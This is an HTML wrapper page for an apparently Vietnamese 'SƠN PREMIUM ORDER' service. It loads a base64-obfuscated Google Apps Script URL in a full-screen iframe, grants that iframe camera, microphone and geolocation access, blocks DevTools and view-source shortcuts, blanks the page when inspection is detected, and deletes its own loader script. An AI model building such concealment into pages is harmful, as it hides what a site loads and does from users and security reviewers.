<!DOCTYPE html>
<html lang="vi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
    <meta name="theme-color" content="#ffffff">
    <title>SƠN PREMIUM ORDER</title>

    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        html, body {
            width: 100%;
            height: 100%;
            height: 100dvh;
            overflow: hidden;
            background: #f5f5f5;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            -webkit-user-select: none;
            user-select: none;
        }

        #app-mount {
            width: 100%;
            height: 100%;
        }

        iframe {
            display: block;
            width: 100%;
            height: 100%;
            border: none;
            -webkit-touch-callout: none;
            -webkit-user-select: none;
        }

        .devtools-lock {
            display: none;
            position: fixed;
            inset: 0;
            z-index: 999999;
            background: #111827;
            color: #ffffff;
            align-items: center;
            justify-content: center;
            text-align: center;
            padding: 24px;
            flex-direction: column;
            gap: 14px;
        }

        .devtools-lock.active {
            display: flex;
        }

        .devtools-lock button {
            margin-top: 6px;
            padding: 10px 20px;
            border: none;
            border-radius: 8px;
            background: #2563eb;
            color: #fff;
            font-weight: 600;
            cursor: pointer;
        }

        /* Tối ưu cho mobile */
        @media (max-width: 768px) {
            html, body {
                position: fixed;
                top: 0;
                left: 0;
                right: 0;
                bottom: 0;
            }

            iframe {
                height: 100dvh;
            }
        }

        /* Ngăn zoom khi double-tap trên iOS */
        @media (hover: none) and (pointer: coarse) {
            input,
            textarea,
            select,
            button {
                font-size: 16px !important;
            }
        }
    </style>
</head>

<body oncontextmenu="return false;">

<div id="app-mount"></div>

<div id="devtools-screen" class="devtools-lock">
    <h2>⚠️ Cảnh báo bảo mật</h2>
    <p>Vui lòng đóng công cụ nhà phát triển (DevTools) để tiếp tục sử dụng SƠN PREMIUM ORDER.</p>
    <button type="button" onclick="location.reload()">Tải lại trang</button>
</div>

<script id="boot-script">
(function () {
    const p1 = "aHR0cHM6Ly9zY3JpcHQuZ29vZ2xlLmNvbS9tYWNyb3Mvcy8=";
    const p2 = "QUtmeWNieHAxbkRBRTZEUXJjdHNnSFh6Y28xa0FQS0Q1S0diMmRETG";
    const p3 = "FWWTM1akJtZmJhcm8weTFIVWZIeURGTkFLdEpfeFI5dkEvZXhlYw==";

    const mount = document.getElementById("app-mount");
    const lockScreen = document.getElementById("devtools-screen");

    function createFrame() {
        const frame = document.createElement("iframe");
        frame.setAttribute("allow", "camera; microphone; geolocation");
        frame.src = atob(p1) + atob(p2 + p3);
        mount.innerHTML = "";
        mount.appendChild(frame);
    }

    function lockPage() {
        mount.innerHTML = "";
        if (lockScreen) lockScreen.classList.add("active");
    }

    createFrame();

    // Chặn phím tắt F12, Ctrl+Shift+I/J/C, Ctrl+U/S, Cmd+Option+I/J/C
    window.addEventListener("keydown", function (e) {
        const key = (e.key || "").toUpperCase();
        const isMac = navigator.platform.toUpperCase().indexOf("MAC") >= 0;
        const mod = isMac ? e.metaKey : e.ctrlKey;

        if (
            e.keyCode === 123 ||
            key === "F12" ||
            (mod && e.shiftKey && ["I", "J", "C"].includes(key)) ||
            (isMac && e.metaKey && e.altKey && ["I", "J", "C"].includes(key)) ||
            (mod && ["U", "S"].includes(key))
        ) {
            e.preventDefault();
            e.stopPropagation();
            lockPage();
            return false;
        }
    }, true);

    // Dò chênh lệch kích thước khi gắn DevTools vào cửa sổ
    const threshold = 160;
    setInterval(function () {
        if (
            window.outerWidth - window.innerWidth > threshold ||
            window.outerHeight - window.innerHeight > threshold
        ) {
            lockPage();
        }
    }, 800);

    // Xóa thẻ script khởi tạo khỏi DOM sau khi chạy
    const self = document.getElementById("boot-script");
    if (self) self.remove();
})();
</script>

</body>
</html>
